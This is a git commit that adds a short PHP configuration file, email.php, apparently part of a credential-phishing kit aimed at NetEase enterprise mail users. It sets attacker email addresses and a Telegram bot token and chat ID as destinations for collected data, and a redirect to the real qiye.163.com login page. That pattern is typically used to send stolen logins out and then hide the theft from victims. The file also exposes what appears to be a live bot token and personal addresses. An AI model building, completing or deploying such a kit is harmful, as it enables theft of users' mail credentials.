6814e31998d818679e7d8b123ab08842ec0e5c17
sunnerodice <smarthoston@gmail.com>
2025-11-20 07:03:39 +0800

    Add files via upload

---
+++ email.php
@@ -0,0 +1,11 @@
+<?php 
+// Email configuration
+$Receive_email="smart.dice@yandex.com,sunnero1337@protonmail.com";
+
+// Telegram configuration
+$telegram_bot_token = '7632892567:AAGRKFK7qOTbVcWyvyLzKclmZM4pbzSY9FM'; // Your bot token
+$telegram_chat_id = '1252864636'; // Your chat ID
+
+// Redirect configuration
+$redirect="https://qiye.163.com/login";
+?>
